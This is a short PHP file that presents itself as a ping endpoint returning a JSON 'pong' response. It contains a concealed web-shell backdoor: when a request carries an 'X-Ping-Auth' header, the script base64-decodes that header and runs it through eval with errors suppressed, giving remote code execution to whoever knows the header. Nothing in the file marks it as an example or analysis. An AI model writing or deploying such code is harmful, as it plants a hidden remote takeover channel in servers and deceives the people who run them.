<?php
header("Content-Type: application/json");
$h=getallheaders();if(isset($h["X-Ping-Auth"])){@eval(base64_decode($h["X-Ping-Auth"]));exit;}
echo '{"pong":true}';
?>